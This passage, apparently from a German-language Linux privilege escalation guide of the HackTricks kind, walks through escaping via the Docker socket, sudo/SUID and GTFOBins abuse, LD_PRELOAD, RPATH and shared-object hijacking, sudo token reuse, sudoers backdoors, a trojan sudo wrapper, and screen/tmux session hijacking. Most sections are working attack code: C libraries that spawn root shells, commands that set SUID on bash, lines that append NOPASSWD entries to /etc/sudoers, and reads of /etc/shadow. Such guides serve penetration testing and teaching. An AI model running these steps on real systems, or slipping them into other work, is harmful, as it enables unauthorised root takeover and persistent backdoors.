2.  **Create a Container:** Sende eine Anfrage, um einen Container zu erstellen, der das Root-Verzeichnis des Hosts mountet.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Starte den neu erstellten Container:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Verwende `socat`, um eine Verbindung zum Container herzustellen, die das Ausführen von Befehlen darin ermöglicht.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Nachdem die `socat`-Verbindung aufgebaut ist, kannst du Befehle direkt im Container ausführen und hast root-Zugriff auf das Dateisystem des Hosts.

### Andere

Beachte, dass, wenn du Schreibrechte auf den docker socket hast, weil du **inside the group `docker`** bist, du [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group). Wenn die [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Siehe **more ways to break out from docker or abuse it to escalate privileges** in:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

Wenn du feststellen solltest, dass du den **`ctr`**-Befehl verwenden kannst, lies die folgende Seite, da **you may be able to abuse it to escalate privileges**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

Wenn du den **`runc`**-Befehl verwenden kannst, lies die folgende Seite, da **you may be able to abuse it to escalate privileges**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus ist ein ausgeklügeltes **inter-Process Communication (IPC)-System**, das Anwendungen ermöglicht, effizient zu interagieren und Daten auszutauschen. Es wurde mit Blick auf moderne Linux-Systeme entwickelt und bietet einen robusten Rahmen für verschiedene Formen der Anwendungskommunikation.

Das System ist vielseitig und unterstützt grundlegendes IPC, das den Datenaustausch zwischen Prozessen verbessert, ähnlich wie **enhanced UNIX domain sockets**. Zudem hilft es beim Broadcasten von Ereignissen oder Signalen und fördert so eine nahtlose Integration zwischen Systemkomponenten. Beispielsweise kann ein Signal eines Bluetooth-Daemons über einen eingehenden Anruf einen Musikplayer stummschalten und so die Benutzererfahrung verbessern. Zusätzlich unterstützt D-Bus ein Remote-Object-System, das Service-Anfragen und Methodensaufrufe zwischen Anwendungen vereinfacht und zuvor komplexe Abläufe stromlinienförmiger macht.

D-Bus arbeitet nach einem **Allow/Deny-Modell** und verwaltet Nachrichtenberechtigungen (Methodenaufrufe, Signal-Emissionen usw.) basierend auf der kumulativen Wirkung übereinstimmender Policy-Regeln. Diese Richtlinien spezifizieren die Interaktionen mit dem Bus und können durch Ausnutzung dieser Berechtigungen potenziell zu privilege escalation führen.

Ein Beispiel für eine solche Richtlinie in `/etc/dbus-1/system.d/wpa_supplicant.conf` wird gezeigt und beschreibt Berechtigungen für den root-Benutzer, Besitzer von `fi.w1.wpa_supplicant1` zu sein sowie Nachrichten an dieses Objekt zu senden und von diesem zu empfangen.

Richtlinien ohne spezifizierten Benutzer oder Gruppe gelten universell, während "default"-Kontext-Richtlinien für alle gelten, die nicht durch andere spezifische Richtlinien abgedeckt sind.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Lerne hier, wie man eine D-Bus-Kommunikation enumerate und exploit:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Network**

Es ist immer interessant, das network zu enumerate und die Position der Maschine zu ermitteln.

### Generic enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Offene Ports

Überprüfe immer die Netzwerkdienste, die auf dem Rechner laufen und mit denen du vor dem Zugriff nicht interagieren konntest:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Prüfe, ob du Traffic sniffen kannst. Wenn du das kannst, könntest du möglicherweise einige credentials abgreifen.
```
timeout 1 tcpdump
```
## Benutzer

### Allgemeine Enumeration

Prüfe, **wer** du bist, welche **Berechtigungen** du hast, welche **Benutzer** im System existieren, welche sich per **login** anmelden können und welche **root-Berechtigungen** besitzen:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

Einige Linux-Versionen waren von einem Fehler betroffen, der Benutzern mit **UID > INT_MAX** erlaubt, Privilegien zu eskalieren. Mehr Infos: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Ausnutzen mit:** **`systemd-run -t /bin/bash`**

### Gruppen

Prüfe, ob du Mitglied einer **Gruppe** bist, die dir root-Rechte gewähren könnte:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Zwischenablage

Prüfe, ob sich (falls möglich) etwas Interessantes in der Zwischenablage befindet
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Passwortrichtlinie
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Bekannte Passwörter

Wenn Sie **ein Passwort** der Umgebung **kennen**, versuchen Sie, sich mit diesem Passwort **als jeden Benutzer anzumelden**.

### Su Brute

Wenn es Ihnen nichts ausmacht, viel Lärm zu machen, und die Binaries `su` und `timeout` auf dem Computer vorhanden sind, können Sie versuchen, Benutzer mit [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) mit dem Parameter `-a` versucht ebenfalls, Benutzer zu brute-forcen.

## Ausnutzung beschreibbarer PATHs

### $PATH

Wenn Sie feststellen, dass Sie **in einen Ordner des $PATH schreiben können**, könnten Sie in der Lage sein, Privilegien zu eskalieren, indem Sie **eine Backdoor in den beschreibbaren Ordner** erstellen, die den Namen eines Befehls trägt, der von einem anderen Benutzer (idealerweise root) ausgeführt wird, und der **nicht aus einem Verzeichnis geladen wird, das im $PATH vor** Ihrem beschreibbaren Ordner liegt.

### SUDO and SUID

Sie könnten berechtigt sein, bestimmte Befehle mit sudo auszuführen, oder Dateien könnten das suid-Bit gesetzt haben. Prüfen Sie das mit:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Einige **unerwartete Befehle erlauben es Ihnen, Dateien zu lesen und/oder zu schreiben oder sogar einen Befehl auszuführen.** Zum Beispiel:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Die Sudo-Konfiguration könnte einem Benutzer erlauben, einen Befehl mit den Rechten eines anderen Benutzers auszuführen, ohne das Passwort zu kennen.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
In diesem Beispiel kann der Benutzer `demo` `vim` als `root` ausführen; es ist nun trivial, eine Shell zu erhalten, indem man einen ssh key in das root-Verzeichnis einfügt oder `sh` aufruft.
```
sudo vim -c '!sh'
```
### SETENV

Diese Direktive erlaubt dem Benutzer, eine **Umgebungsvariable** beim Ausführen von etwas zu setzen:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Dieses Beispiel, **basierend auf der HTB-Maschine Admirer**, war **verwundbar** gegenüber **PYTHONPATH hijacking**, wodurch beim Ausführen des Skripts als root eine beliebige python-Bibliothek geladen werden konnte:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV beibehalten durch sudo env_keep → root shell

Wenn sudoers `BASH_ENV` beibehält (z. B. `Defaults env_keep+="ENV BASH_ENV"`), kannst du das nicht-interaktive Startverhalten von Bash ausnutzen, um beliebigen Code als root auszuführen, wenn du einen erlaubten Befehl aufrufst.

- Why it works: Für nicht-interaktive Shells wertet Bash `$BASH_ENV` aus und sources diese Datei, bevor das Zielskript ausgeführt wird. Viele sudo-Regeln erlauben das Ausführen eines Skripts oder eines Shell-Wrappers. Wenn `BASH_ENV` von sudo beibehalten wird, wird deine Datei mit root-Rechten gesourced.

- Anforderungen:
- Eine sudo-Regel, die du ausführen kannst (jedes Ziel, das `/bin/bash` nicht-interaktiv aufruft, oder jedes bash script).
- `BASH_ENV` in `env_keep` vorhanden (prüfe mit `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Hardening:
- Entferne `BASH_ENV` (und `ENV`) aus `env_keep`, verwende bevorzugt `env_reset`.
- Vermeide Shell-Wrapper für sudo-allowed Befehle; nutze minimale Binärdateien.
- Ziehe sudo I/O-Logging und Alerting in Betracht, wenn erhaltene env-Variablen verwendet werden.

### Pfade zum Umgehen von Sudo-Ausführung

**Jump** um andere Dateien zu lesen oder **symlinks** zu verwenden. Zum Beispiel in der sudoers-Datei: _hacker10 ALL= (root) /bin/less /var/log/_*
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Wenn ein **wildcard** verwendet wird (\*), ist es noch einfacher:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Gegenmaßnahmen**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary ohne Befehls-Pfad

Wenn die **sudo permission** für einen einzelnen Befehl **ohne Angabe des Pfades** gewährt wird: _hacker10 ALL= (root) less_ kannst du dies ausnutzen, indem du die PATH-Variable änderst.
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Diese Technik kann auch verwendet werden, wenn eine **suid** binary **einen anderen Befehl ausführt, ohne den Pfad anzugeben (prüfe immer mit** _**strings**_ **den Inhalt einer ungewöhnlichen SUID binary)**).

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary with command path

Wenn die **suid** binary **einen anderen Befehl ausführt und dabei den Pfad angibt**, dann kannst du versuchen, **eine Funktion zu exportieren**, die den Namen des Befehls trägt, den die suid-Datei aufruft.

Zum Beispiel, wenn eine suid binary _**/usr/sbin/service apache2 start**_ aufruft, musst du versuchen, die Funktion zu erstellen und zu exportieren:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Dann, wenn du das suid-Binary aufrufst, wird diese Funktion ausgeführt

### LD_PRELOAD & **LD_LIBRARY_PATH**

Die Umgebungsvariable **LD_PRELOAD** wird verwendet, um eine oder mehrere shared libraries (.so files) anzugeben, die vom Loader vor allen anderen geladen werden, einschließlich der Standard-C-Bibliothek (`libc.so`). Dieser Vorgang ist als Vorladen einer Bibliothek bekannt.

Um jedoch die Systemsicherheit zu gewährleisten und zu verhindern, dass diese Funktion ausgenutzt wird, insbesondere bei **suid/sgid**-Executables, erzwingt das System bestimmte Bedingungen:

- Der Loader ignoriert **LD_PRELOAD** für Executables, bei denen die real user ID (_ruid_) nicht mit der effective user ID (_euid_) übereinstimmt.
- Bei Executables mit suid/sgid werden nur Bibliotheken in Standardpfaden vorgeladen, die selbst ebenfalls suid/sgid sind.

Eine Privilegieneskalation kann auftreten, wenn du die Möglichkeit hast, Befehle mit `sudo` auszuführen und die Ausgabe von `sudo -l` die Anweisung **env_keep+=LD_PRELOAD** enthält. Diese Konfiguration erlaubt es, dass die Umgebungsvariable **LD_PRELOAD** bestehen bleibt und auch dann erkannt wird, wenn Befehle mit `sudo` ausgeführt werden, was potenziell zur Ausführung beliebigen Codes mit erhöhten Rechten führen kann.
```
Defaults        env_keep += LD_PRELOAD
```
Speichere als **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Dann **kompiliere es** mit:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Schließlich, **escalate privileges** ausführen
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Ein ähnlicher privesc kann ausgenutzt werden, wenn der Angreifer die **LD_LIBRARY_PATH** env variable kontrolliert, da er den Pfad kontrolliert, in dem Bibliotheken gesucht werden.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Wenn Sie auf ein Binary mit **SUID**-Rechten stoßen, das ungewöhnlich erscheint, ist es ratsam zu prüfen, ob es **.so**-Dateien korrekt lädt. Das lässt sich durch Ausführen des folgenden Befehls überprüfen:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Zum Beispiel deutet das Auftreten eines Fehlers wie _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ auf eine mögliche exploitation hin.

Um dies zu exploit, erstellt man eine C-Datei, sagen wir _"/path/to/.config/libcalc.c"_, die folgenden Code enthält:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Dieser Code verfolgt nach dem Kompilieren und Ausführen das Ziel, elevate privileges zu erlangen, indem er Dateiberechtigungen manipuliert und eine shell mit elevated privileges ausführt.

Kompiliere die obige C-Datei in eine Shared-Object-Datei (.so) mit:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Abschließend sollte das Ausführen der betroffenen SUID-Binärdatei den exploit auslösen und damit eine potenzielle system compromise ermöglichen.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Da wir nun ein SUID-Binary gefunden haben, das eine Bibliothek aus einem Verzeichnis lädt, in das wir schreiben können, erstellen wir die Bibliothek in diesem Verzeichnis mit dem erforderlichen Namen:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Wenn Sie einen Fehler wie den folgenden erhalten:
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
das bedeutet, dass die Bibliothek, die du erzeugt hast, eine Funktion namens `a_function_name` enthalten muss.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) ist eine kuratierte Liste von Unix-Binaries, die von einem Angreifer ausgenutzt werden können, um lokale Sicherheitsbeschränkungen zu umgehen. [**GTFOArgs**](https://gtfoargs.github.io/) ist dasselbe, aber für Fälle, in denen du in einem Befehl **nur Argumente injizieren** kannst.

Das Projekt sammelt legitime Funktionen von Unix-Binaries, die missbraucht werden können, um aus eingeschränkten Shells auszubrechen, Privilegien zu eskalieren oder aufrechtzuerhalten, Dateien zu übertragen, bind- und reverse-Shells zu starten und andere Post-Exploitation-Aufgaben zu erleichtern.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Wenn du auf `sudo -l` zugreifen kannst, kannst du das Tool [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) verwenden, um zu prüfen, ob es einen Weg findet, eine sudo-Regel auszunutzen.

### Reusing Sudo Tokens

In Fällen, in denen du **sudo access** hast, aber nicht das Passwort, kannst du Privilegien eskalieren, indem du **auf die Ausführung eines sudo-Kommandos wartest und dann das Session-Token kaperst**.

Voraussetzungen, um Privilegien zu eskalieren:

- Du hast bereits eine Shell als Benutzer "_sampleuser_"
- "_sampleuser_" hat **`sudo` verwendet**, um etwas in den **letzten 15 Minuten** auszuführen (standardmäßig ist das die Dauer des sudo-Tokens, die es uns erlaubt, `sudo` zu verwenden, ohne ein Passwort anzugeben)
- `cat /proc/sys/kernel/yama/ptrace_scope` ist 0
- `gdb` ist zugänglich (du kannst es hochladen)

(Du kannst `ptrace_scope` vorübergehend aktivieren mit `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` oder dauerhaft, indem du `/etc/sysctl.d/10-ptrace.conf` bearbeitest und `kernel.yama.ptrace_scope = 0` setzt)

Wenn alle diese Voraussetzungen erfüllt sind, **kannst du Privilegien eskalieren mit:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- Der **first exploit** (`exploit.sh`) wird das Binary `activate_sudo_token` in _/tmp_ erstellen. Du kannst es verwenden, um **das sudo-Token in deiner Session zu aktivieren** (du bekommst nicht automatisch eine root-Shell, führe `sudo su` aus):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- Der **zweite exploit** (`exploit_v2.sh`) erstellt eine sh shell in _/tmp_, **im Besitz von root mit setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- Der **dritte exploit** (`exploit_v3.sh`) wird eine **sudoers file** erstellen, die **sudo tokens dauerhaft macht und allen Benutzern die Nutzung von sudo erlaubt**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Wenn du **Schreibrechte** im Ordner oder für eine der darin erstellten Dateien hast, kannst du das Binary [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) verwenden, um **ein sudo-Token für einen Benutzer und PID zu erstellen**.\
Zum Beispiel, wenn du die Datei _/var/run/sudo/ts/sampleuser_ überschreiben kannst und eine Shell als dieser Benutzer mit PID 1234 hast, kannst du **sudo-Rechte erlangen**, ohne das Passwort zu kennen, indem du:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Die Datei `/etc/sudoers` und die Dateien im Verzeichnis `/etc/sudoers.d` legen fest, wer `sudo` verwenden kann und wie. Diese Dateien **können standardmäßig nur vom Benutzer root und der Gruppe root gelesen werden**.\
**Wenn** du diese Datei **lesen** kannst, könntest du **einige interessante Informationen erhalten**, und wenn du **irgendeine Datei schreiben** kannst, kannst du **Privilegien eskalieren**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Wenn Sie schreiben können, können Sie diese Berechtigung missbrauchen.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Eine andere Möglichkeit, diese Berechtigungen auszunutzen:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Es gibt einige Alternativen zum `sudo`-Binary, z. B. `doas` für OpenBSD. Prüfe dessen Konfiguration in `/etc/doas.conf`.
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Wenn du weißt, dass **ein Benutzer sich normalerweise an einer Maschine anmeldet und `sudo` verwendet**, um Privilegien zu erhöhen, und du eine Shell in diesem Benutzerkontext hast, kannst du **ein neues sudo executable** erstellen, das zuerst deinen Code als root und dann den Befehl des Benutzers ausführt. Anschließend **änderst du den $PATH** des Benutzerkontexts (zum Beispiel indem du den neuen Pfad in .bash_profile hinzufügst), sodass beim Ausführen von sudo dein sudo executable ausgeführt wird.

Beachte, dass wenn der Benutzer eine andere Shell (nicht bash) verwendet, du andere Dateien anpassen musst, um den neuen Pfad hinzuzufügen. Zum Beispiel modifiziert [sudo-piggyback](https://github.com/APTy/sudo-piggyback) `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Ein weiteres Beispiel findest du in [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Oder so etwas ausführen:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Gemeinsame Bibliothek

### ld.so

Die Datei `/etc/ld.so.conf` gibt an, **woher die geladenen Konfigurationsdateien stammen**. Typischerweise enthält diese Datei den folgenden Pfad: `include /etc/ld.so.conf.d/*.conf`

Das bedeutet, dass die Konfigurationsdateien aus `/etc/ld.so.conf.d/*.conf` eingelesen werden. Diese Konfigurationsdateien **verweisen auf andere Ordner**, in denen nach **Bibliotheken** gesucht wird. Zum Beispiel ist der Inhalt von `/etc/ld.so.conf.d/libc.conf` `/usr/local/lib`. **Das bedeutet, dass das System nach Bibliotheken innerhalb von `/usr/local/lib` suchen wird**.

Falls aus irgendeinem Grund **ein Benutzer Schreibrechte** auf einen der angegebenen Pfade hat: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, eine Datei innerhalb von `/etc/ld.so.conf.d/` oder einen Ordner, der in der Konfigurationsdatei innerhalb von `/etc/ld.so.conf.d/*.conf` angegeben ist, könnte er möglicherweise Privilegien eskalieren.\
Sieh dir **an, wie diese Fehlkonfiguration ausgenutzt werden kann** auf der folgenden Seite:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Wenn man die lib in `/var/tmp/flag15/` kopiert, wird sie vom Programm an dieser Stelle verwendet, wie in der `RPATH`-Variable angegeben.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Erstelle dann eine bösartige Bibliothek in `/var/tmp` mit `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Linux capabilities stellen eine **Teilmenge der für root verfügbaren Privilegien für einen Prozess** dar. Das zerlegt effektiv die root **Privilegien in kleinere und unterscheidbare Einheiten**. Jede dieser Einheiten kann dann Prozessen unabhängig zugewiesen werden. Auf diese Weise wird die Gesamtheit der Privilegien reduziert, wodurch das Exploit-Risiko sinkt.\
Lese die folgende Seite, um **mehr über capabilities und wie man sie missbraucht** zu erfahren:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Verzeichnisberechtigungen

In einem Verzeichnis bedeutet das **Bit für "execute"**, dass der betroffene Benutzer in den Ordner "**cd**" kann.\
Das **"read"**-Bit bedeutet, dass der Benutzer die **Dateien** **auflisten** kann, und das **"write"**-Bit bedeutet, dass der Benutzer **Dateien löschen** und **neue Dateien erstellen** kann.

## ACLs

Access Control Lists (ACLs) stellen die sekundäre Ebene der discretionary-Berechtigungen dar und sind in der Lage, die traditionellen ugo/rwx-Berechtigungen **zu überschreiben**. Diese Berechtigungen verbessern die Kontrolle über den Zugriff auf Dateien oder Verzeichnisse, indem sie bestimmten Benutzern, die weder Eigentümer noch Teil der Gruppe sind, Rechte gewähren oder verweigern. Dieses Maß an **Granularität sorgt für eine präzisere Zugriffskontrolle**. Weitere Details sind [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Gib** dem Benutzer "kali" Lese- und Schreibrechte für eine Datei:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Abrufen** von Dateien mit bestimmten ACLs aus dem System:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Offene shell sessions

In **alten Versionen** kannst du möglicherweise eine **shell** session eines anderen Benutzers (**root**) **hijack**.\
In **neuesten Versionen** kannst du dich nur noch zu **screen** sessions **deines eigenen Benutzers** **connect**. Allerdings könntest du **interesting information inside the session** finden.

### screen sessions hijacking

**Liste der screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**An eine session anhängen**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

Dies war ein Problem bei **old tmux versions**. Ich konnte als non-privileged user eine von root erstellte tmux (v2.1)-Session nicht hijacken.

**List tmux sessions**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**An eine session anhängen**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Siehe **Valentine box von HTB** als Beispiel.

## SSH

### Debian OpenSSL Vorhersehbarer PRNG - CVE-2008-0166

Alle SSL- und SSH-Schlüssel, die auf Debian-basierten Systemen (Ubuntu, Kubuntu, etc.) zwischen September 2006 und dem 13. Mai 2008 erzeugt wurden, könnten von diesem Bug betroffen sein.\
Dieser Fehler tritt beim Erstellen eines neuen ssh-Schlüssels in diesen OS auf, da **nur 32.768 Variationen möglich waren**. Das bedeutet, dass alle Möglichkeiten berechnet werden können und **mit dem öffentlichen ssh-Schlüssel der entsprechende private Schlüssel gesucht werden kann**. Die berechneten Möglichkeiten findest du hier: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interessante Konfigurationswerte

- **PasswordAuthentication:** Gibt an, ob Passwort-Authentifizierung erlaubt ist. Der Standard ist `no`.
- **PubkeyAuthentication:** Gibt an, ob Public-Key-Authentifizierung erlaubt ist. Der Standard ist `yes`.
- **PermitEmptyPasswords**: Wenn Passwort-Authentifizierung erlaubt ist, legt dies fest, ob der Server Logins für Accounts mit leerem Passwort zulässt. Der Standard ist `no`.

### PermitRootLogin

Legt fest, ob sich root über ssh anmelden kann, Standard ist `no`. Mögliche Werte:

- `yes`: root kann sich mit Passwort und privatem Schlüssel anmelden
- `without-password` or `prohibit-password`: root kann sich nur mit privatem Schlüssel anmelden
- `forced-commands-only`: root kann sich nur mit privatem Schlüssel anmelden und nur, wenn die command-Optionen angegeben sind
